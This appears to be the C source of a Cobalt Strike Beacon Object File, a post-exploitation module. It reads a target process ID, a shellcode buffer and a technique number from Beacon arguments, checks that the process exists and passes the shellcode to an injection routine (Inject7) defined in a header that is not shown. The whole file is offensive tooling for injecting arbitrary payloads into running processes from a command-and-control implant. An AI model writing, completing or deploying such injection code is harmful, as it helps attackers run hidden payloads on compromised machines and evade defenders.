#include "SeventhGuest.h"

int check_pid(DWORD dwPid) {
   HANDLE hProcess = NULL;
   hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
   if (hProcess != NULL) {
      return 1;
   }
   return 0;
}

void go(char * args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    DWORD pid = BeaconDataInt(&parser);
    SIZE_T shellcodeSize = NULL;
    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSize);
    DWORD technique = BeaconDataInt(&parser);

    BeaconPrintf(CALLBACK_OUTPUT, "Selected technique: %d", technique);
    // For safety, let's check if target process is running. Targeting an inexistent process would kill Beacon
    if (check_pid(pid)) {
       Inject7(pid, shellcode, shellcodeSize);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "PID %d not found", pid);
       }
}
